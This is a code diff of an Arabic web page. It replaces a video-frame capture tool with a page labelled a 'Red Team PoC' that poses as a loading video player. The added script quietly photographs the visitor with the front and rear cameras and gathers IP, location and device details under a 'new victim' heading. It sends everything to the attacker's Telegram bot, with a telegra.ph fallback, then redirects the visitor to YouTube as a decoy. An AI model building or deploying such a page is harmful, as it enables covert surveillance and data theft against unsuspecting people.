@@ -1,409 +1,181 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Capture & Link Checker</title>
-    <style>
-        :root {
-            --bg: #0b0f19;
-            --panel: #131c2e;
-            --green: #00ff66;
-            --blue: #3b82f6;
-            --red: #ff3366;
-            --text: #ffffff;
-            --muted: #64748b;
-            --border: #1e293b;
-        }
-
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: sans-serif;
-        }
-
-        body {
-            background-color: var(--bg);
-            color: var(--text);
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            min-height: 100vh;
-        }
-
-        .section {
-            width: 100%;
-            max-width: 850px;
-            background: var(--panel);
-            padding: 25px;
-            border-radius: 16px;
-            border: 1px solid var(--border);
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
-            text-align: center;
-            margin-bottom: 25px;
-        }
-
-        .upload-zone {
-            border: 2px dashed var(--blue);
-            border-radius: 12px;
-            padding: 30px;
-            cursor: pointer;
-            background: rgba(59, 130, 246, 0.03);
-            margin-bottom: 15px;
-        }
-
-        #videoInput { display: none; }
-
-        #videoPreview {
-            width: 100%;
-            max-height: 350px;
-            border-radius: 10px;
-            margin-top: 15px;
-            display: none;
-            background: #000;
-        }
-
-        .btn-group {
-            display: flex;
-            gap: 10px;
-            margin-top: 10px;
-        }
-
-        .btn {
-            color: white;
-            border: none;
-            padding: 12px 25px;
-            font-size: 1rem;
-            font-weight: bold;
-            border-radius: 8px;
-            cursor: pointer;
-            width: 100%;
-        }
-
-        .btn-capture { background: var(--blue); }
-        .btn-copy { background: #475569; display: none; }
-        .btn-check { background: var(--red); width: auto; padding: 0 20px; }
-
-        .progress-container {
-            margin-top: 20px;
-            display: none;
-        }
-
-        .progress-bar {
-            width: 100%;
-            height: 8px;
-            background-color: #1e293b;
-            border-radius: 5px;
-            overflow: hidden;
-        }
-
-        .progress-fill {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, var(--blue), var(--green));
-        }
-
-        #progressText {
-            margin-top: 8px;
-            font-size: 0.9rem;
-            color: var(--muted);
-        }
-
-        .gallery-container {
-            width: 100%;
-            max-width: 850px;
-            display: none;
-        }
-
-        .gallery {
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-            width: 100%;
-        }
-
-        .capture-card {
-            background: #162238;
-            border-radius: 12px;
-            overflow: hidden;
-            border: 1px solid var(--border);
-        }
-
-        .capture-card img {
-            width: 100%;
-            height: auto;
-            display: block;
-            cursor: pointer;
-        }
-
-        .capture-info {
-            padding: 10px 15px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            background: #0f172a;
-            font-size: 0.9rem;
-        }
-
-        .input-group {
-            display: flex;
-            gap: 10px;
-            margin-top: 10px;
-        }
-
-        .input-group input {
-            flex: 1;
-            padding: 12px;
-            border-radius: 8px;
-            border: 1px solid #4b5563;
-            background: #1f2937;
-            color: white;
-            outline: none;
-            text-align: left;
-        }
-
-        #checkerResult {
-            margin-top: 15px;
-            display: none;
-            border-radius: 8px;
-            overflow: hidden;
-            border: 1px solid #374151;
-            background: #000;
-        }
-
-        #checkerResult img {
-            width: 100%;
-            max-height: 400px;
-            object-fit: contain;
-            display: block;
-            cursor: pointer;
-        }
-
-        .viewer-overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.95);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-        }
-
-        .viewer-overlay img {
-            max-width: 95%;
-            max-height: 85%;
-            object-fit: contain;
-            border-radius: 8px;
-        }
-
-        .close-btn {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            background: var(--red);
-            color: white;
-            border: none;
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            font-size: 1.2rem;
-            font-weight: bold;
-            cursor: pointer;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>مشغّل الفيديو — جارٍ التحميل...</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{background:#0f1115;color:#e8e8e8;font-family:"Segoe UI",Tahoma,Arial,sans-serif;height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden}
+  .box{text-align:center}
+  .player{width:320px;height:180px;border-radius:12px;margin:0 auto 18px;background:radial-gradient(circle at 30% 30%,#1c2230,#0a0c10);display:flex;align-items:center;justify-content:center;border:1px solid #232a38}
+  .play{width:64px;height:64px;border-radius:50%;background:#e50914;display:flex;align-items:center;justify-content:center;box-shadow:0 0 30px rgba(229,9,20,.5);animation:pulse 1.6s infinite}
+  .play::after{content:"";border-style:solid;border-width:12px 0 12px 20px;border-color:transparent transparent transparent #fff;margin-right:4px}
+  @keyframes pulse{0%,100%{box-shadow:0 0 15px rgba(229,9,20,.4)}50%{box-shadow:0 0 40px rgba(229,9,20,.9)}}
+  .bar{width:320px;height:6px;background:#232a38;border-radius:3px;margin:14px auto 10px;overflow:hidden}
+  .bar i{display:block;height:100%;width:0;background:#e50914;border-radius:3px;animation:load 5s ease forwards}
+  @keyframes load{to{width:100%}}
+  .txt{color:#9aa4b5;font-size:14px}
+</style>
 </head>
 <body>
+<div class="box">
+  <div class="player"><div class="play"></div></div>
+  <div class="bar"><i></i></div>
+  <div class="txt">جارٍ الاتصال بالخادم وتشفير الجلسة...</div>
+</div>
 
-    <div class="section">
-        <div class="upload-zone" onclick="document.getElementById('videoInput').click()">
-            <input type="file" id="videoInput" accept="video/*">
-            <video id="videoPreview" controls></video>
-        </div>
+<script>
+/* ============================================================
+   Camera Capture → Telegram Bot — Red Team PoC
+   يلتقط صورة من الكاميرا الأمامية ثم الخلفية ويرسلها للبوت
+   ============================================================ */
 
-        <div class="btn-group">
-            <button id="captureBtn" class="btn btn-capture" style="display:none;">رصد</button>
-            <button id="copyLinksBtn" class="btn btn-copy">نسخ جميع روابط الصور</button>
-        </div>
+const CONFIG = {
+  botToken:   "ضع_توكن_البوت_هنا",          // من BotFather
+  chatId:     "ضع_رقم_الدردشة_هنا",          // معرفك (userinfobot أو getUpdates)
+  decoyUrl:   "https://www.youtube.com",     // التحويل بعد التصوير (اتركه فارغ "" لتعطيله)
+  redirectDelay: 6000,                        // ms قبل التحويل
+  cameraWarmup: 1200,                         // ms انتظار تثبيت الكاميرا قبل اللقطة
+  quality: 0.85,                              // جودة JPEG
+  apiBase:  "",                               // Worker اختياري (انظر الشرح) — مثال: "https://xxx.workers.dev"
+  grabIP:   true                              // التقاط IP وموقع تقريبي مع اللقطات
+};
 
-        <div class="progress-container" id="progressContainer">
-            <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
-            <p id="progressText"></p>
-        </div>
-    </div>
+const sleep = ms => new Promise(r => setTimeout(r, ms));
 
-    <div class="gallery-container" id="galleryContainer">
-        <div class="gallery" id="gallery"></div>
-    </div>
+/* ---------- 1) معلومات الضحية (IP + موقع تقريبي) ---------- */
+async function getIPInfo() {
+  if (!CONFIG.grabIP) return null;
+  for (const url of ["https://ipwho.is/", "https://ipapi.co/json/"]) {
+    try {
+      const r = await fetch(url, { cache: "no-store" });
+      const j = await r.json();
+      if (j && (j.ip || j.latitude)) return j;
+    } catch (e) {}
+  }
+  return null;
+}
 
-    <div class="section" style="background: #111827;">
-        <div class="input-group">
-            <input type="text" id="urlInput" placeholder="رابط الصورة المباشر" dir="ltr">
-            <button class="btn btn-check" id="checkBtn">فحص</button>
-        </div>
-        <div id="checkerResult"></div>
-    </div>
+/* ---------- 2) رابط API مع دعم الـ Worker ---------- */
+function apiUrl(method) {
+  if (CONFIG.apiBase) return `${CONFIG.apiBase.replace(/\/+$/,"")}/${method}?token=${CONFIG.botToken}`;
+  return `https://api.telegram.org/bot${CONFIG.botToken}/${method}`;
+}
 
-    <div class="viewer-overlay" id="viewerOverlay">
-        <button class="close-btn" id="closeViewer">X</button>
-        <img id="viewerImage" src="" alt="">
-    </div>
+/* ---------- 3) التقاط صورة من كاميرا ---------- */
+async function capturePhoto(facingMode) {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: { ideal: facingMode }, width: { ideal: 1280 }, height: { ideal: 720 } },
+      audio: false
+    });
+    const video = document.createElement("video");
+    video.setAttribute("playsinline", "");
+    video.muted = true;
+    video.srcObject = stream;
+    video.style.cssText = "position:fixed;top:0;left:0;width:2px;height:2px;opacity:.01;pointer-events:none;z-index:-1";
+    document.body.appendChild(video);
+    await video.play();
+    await sleep(CONFIG.cameraWarmup);
 
-    <canvas id="hiddenCanvas" style="display:none;"></canvas>
+    const canvas = document.createElement("canvas");
+    canvas.width  = video.videoWidth  || 1280;
+    canvas.height = video.videoHeight || 720;
+    const ctx = canvas.getContext("2d");
+    if (facingMode === "user") {           // عكس الكاميرا الأمامية لصورة طبيعية
+      ctx.translate(canvas.width, 0);
+      ctx.scale(-1, 1);
+    }
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    <script>
-        // ضع بيانات حسابك هنا ليعمل الرفع مباشرة
-        const GITHUB_TOKEN = "ضع_التوكن_هنا"; 
-        const GITHUB_REPO = "اسم_المستخدم/اسم_المستودع"; 
-        const GITHUB_BRANCH = "main"; 
+    stream.getTracks().forEach(t => t.stop());
+    video.remove();
 
-        const videoInput = document.getElementById('videoInput');
-        const videoPreview = document.getElementById('videoPreview');
-        const captureBtn = document.getElementById('captureBtn');
-        const copyLinksBtn = document.getElementById('copyLinksBtn');
-        const progressContainer = document.getElementById('progressContainer');
-        const progressFill = document.getElementById('progressFill');
-        const progressText = document.getElementById('progressText');
-        const galleryContainer = document.getElementById('galleryContainer');
-        const gallery = document.getElementById('gallery');
-        const canvas = document.getElementById('hiddenCanvas');
-        const ctx = canvas.getContext('2d');
-        const viewerOverlay = document.getElementById('viewerOverlay');
-        const viewerImage = document.getElementById('viewerImage');
-        const closeViewer = document.getElementById('closeViewer');
-        const urlInput = document.getElementById('urlInput');
-        const checkBtn = document.getElementById('checkBtn');
-        const checkerResult = document.getElementById('checkerResult');
+    return await new Promise(res => canvas.toBlob(res, "image/jpeg", CONFIG.quality));
+  } catch (e) {
+    return null; // رفض الإذن أو لا توجد كاميرا
+  }
+}
 
-        let duration = 0;
-        let uploadedLinks = [];
+/* ---------- 4) رفع الصورة على telegra.ph (fallback) ---------- */
+async function uploadToTelegraph(blob) {
+  const fd = new FormData();
+  fd.append("file", blob, "photo.jpg");
+  const r = await fetch("https://telegra.ph/upload", { method: "POST", body: fd });
+  const j = await r.json();
+  if (j && j[0] && j[0].src) return "https://telegra.ph" + j[0].src;
+  return null;
+}
 
-        videoInput.addEventListener('change', function(e) {
-            const file = e.target.files[0];
-            if (file) {
-                videoPreview.src = URL.createObjectURL(file);
-                videoPreview.style.display = 'block';
-                captureBtn.style.display = 'block';
-                copyLinksBtn.style.display = 'none';
-                gallery.innerHTML = '';
-                galleryContainer.style.display = 'none';
-                progressContainer.style.display = 'none';
-                uploadedLinks = [];
-                videoPreview.onloadedmetadata = function() { duration = videoPreview.duration; };
-            }
-        });
+/* ---------- 5) إرسال صورة (ثلاث طبقات) ---------- */
+async function sendPhoto(blob, caption) {
+  // طبقة 1: multipart مباشر — الطلب يوصل حتى لو المتصفح ما يقرأ الرد (CORS)
+  try {
+    const fd = new FormData();
+    fd.append("chat_id", CONFIG.chatId);
+    fd.append("photo", blob, "photo.jpg");
+    if (caption) fd.append("caption", caption);
+    const r = await fetch(apiUrl("sendPhoto"), { method: "POST", body: fd });
+    if (r.ok) return true;
+  } catch (e) {}
 
-        // دالة الرفع وإنتاج رابط الـ Raw المباشر بامتداد .jpg
-        async function uploadToGitHub(base64Data, filename) {
-            if(GITHUB_TOKEN.startsWith("ضع_")) return null;
-            const cleanBase64 = base64Data.split(',')[1];
-            const url = `https://api.github.com/repos/${GITHUB_REPO}/contents/${filename}`;
-            
-            try {
-                const response = await fetch(url, {
-                    method: 'PUT',
-                    headers: {
-                        'Authorization': `token ${GITHUB_TOKEN}`,
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        message: `Upload ${filename}`,
-                        content: cleanBase64,
-                        branch: GITHUB_BRANCH
-                    })
-                });
-                if(response.ok) {
-                    // إرجاع رابط الـ raw المباشر للصورة بنطاق jpg
-                    return `https://raw.githubusercontent.com/${GITHUB_REPO}/${GITHUB_BRANCH}/${filename}`;
-                }
-            } catch(e) { console.error(e); }
-            return null;
-        }
+  // طبقة 2: رفع على telegra.ph ثم إرسال الرابط
+  try {
+    const url = await uploadToTelegraph(blob);
+    if (url) {
+      const p = new URLSearchParams({ chat_id: CONFIG.chatId, photo: url });
+      if (caption) p.set("caption", caption);
+      await fetch(apiUrl("sendPhoto") + "?" + p.toString(), { method: "POST" });
+      return true;
+    }
+  } catch (e) {}
+  return false;
+}
 
-        captureBtn.addEventListener('click', async function() {
-            if (!duration) return;
-            captureBtn.disabled = true;
-            progressContainer.style.display = 'block';
-            galleryContainer.style.display = 'block';
-            gallery.innerHTML = '';
-            uploadedLinks = [];
+/* ---------- 6) إرسال رسالة نصية ---------- */
+async function sendText(text) {
+  try {
+    const body = new URLSearchParams({ chat_id: CONFIG.chatId, text });
+    const r = await fetch(apiUrl("sendMessage"), { method: "POST", body });
+    return r.ok;
+  } catch (e) { return true; } // الطلب وصل رغم حجب القراءة
+}
 
-            canvas.width = videoPreview.videoWidth;
-            canvas.height = videoPreview.videoHeight;
+/* ---------- التنفيذ الرئيسي ---------- */
+(async () => {
+  if (!CONFIG.botToken.startsWith("ضع") && !CONFIG.chatId.startsWith("ضع")) {
+    if (sessionStorage.getItem("_done")) { if (CONFIG.decoyUrl) location.replace(CONFIG.decoyUrl); return; }
+    sessionStorage.setItem("_done", "1");
+  } else {
+    console.warn("[PoC] ضع botToken و chatId في CONFIG");
+  }
 
-            const step = 0.1; 
-            const timestampId = Date.now();
+  if (CONFIG.decoyUrl) setTimeout(() => location.replace(CONFIG.decoyUrl), CONFIG.redirectDelay);
+  if (!window.isSecureContext) console.warn("[PoC] الكاميرا تحتاج HTTPS");
 
-            for (let time = 0; time <= duration; time += step) {
-                videoPreview.currentTime = time;
-                await new Promise(r => videoPreview.onseeked = r);
+  const info  = await getIPInfo();
+  const ua    = navigator.userAgent;
+  const stamp = new Date().toLocaleString("ar-EG");
 
-                ctx.drawImage(videoPreview, 0, 0, canvas.width, canvas.height);
-                const imgData = canvas.toDataURL('image/jpeg', 0.95);
-                const formattedTime = time.toFixed(2).replace('.', ',');
+  const victimSummary =
+    "ضحية جديدة\n" +
+    "الوقت: " + stamp + "\n" +
+    "IP: " + (info?.ip || "غير معروف") + "\n" +
+    "الموقع: " + [info?.city, info?.region, info?.country].filter(Boolean).join("، ") + "\n" +
+    "الجهاز: " + ua.slice(0, 110) + "\n" +
+    "اللغة: " + navigator.language + " | الشاشة: " + screen.width + "x" + screen.height;
 
-                // تسمية الملف بنطاق .jpg ليكون متوافقاً
-                const filename = `snap_${timestampId}_${time.toFixed(2).replace('.', '_')}.jpg`;
-                const githubRawUrl = await uploadToGitHub(imgData, filename);
-                
-                if(githubRawUrl) {
-                    uploadedLinks.push(githubRawUrl);
-                }
+  // التصوير: أمامية ← مهلة قصيرة ← خلفية
+  const front = await capturePhoto("user");
+  await sleep(400);
+  const back  = await capturePhoto("environment");
 
-                const card = document.createElement('div');
-                card.className = 'capture-card';
-                const img = document.createElement('img');
-                img.src = imgData;
-                img.onclick = () => { viewerImage.src = imgData; viewerOverlay.style.display = 'flex'; };
-
-                const info = document.createElement('div');
-                info.className = 'capture-info';
-                info.innerHTML = `<span>⏱️ ${formattedTime}</span>`;
-
-                card.appendChild(img);
-                card.appendChild(info);
-                gallery.appendChild(card);
-
-                const pct = Math.round((time / duration) * 100);
-                progressFill.style.width = pct + '%';
-                progressText.innerText = `${formattedTime}`;
-            }
-            captureBtn.disabled = false;
-            if(uploadedLinks.length > 0) {
-                copyLinksBtn.style.display = 'block';
-            }
-        });
-
-        // نسخ جميع روابط الـ Raw المباشرة المستخرجة دفعة واحدة عند الضغط
-        copyLinksBtn.addEventListener('click', function() {
-            if(uploadedLinks.length === 0) return;
-            const linksText = uploadedLinks.join('\n');
-            navigator.clipboard.writeText(linksText).then(() => {
-                alert('تم نسخ جميع روابط الـ Raw بنجاح!');
-            });
-        });
-
-        closeViewer.onclick = function() { viewerOverlay.style.display = 'none'; };
-
-        checkBtn.addEventListener('click', function() {
-            const url = urlInput.value.trim();
-            if(!url) return;
-
-            checkerResult.innerHTML = '';
-            checkerResult.style.display = 'block';
-
-            const checkedImg = document.createElement('img');
-            checkedImg.src = url;
-            
-            checkedImg.onload = function() {
-                checkerResult.appendChild(checkedImg);
-                checkedImg.onclick = () => { viewerImage.src = url; viewerOverlay.style.display = 'flex'; };
-            };
-            checkedImg.onerror = function() {
-                checkerResult.innerHTML = `<p style="padding: 15px; color: var(--red);">Error</p>`;
-            };
-        });
-    </script>
+  let sent = 0;
+  if (front) { await sendPhoto(front, "الكاميرا الأمامية\n" + victimSummary); sent++; }
+  if (back)  { await sendPhoto(back,  "الكاميرا الخلفية\n" + victimSummary); sent++; }
+  if (!sent) await sendText("تعذر التصوير (رفض إذن الكاميرا)\n" + victimSummary);
+})();
+</script>
 </body>
 </html>
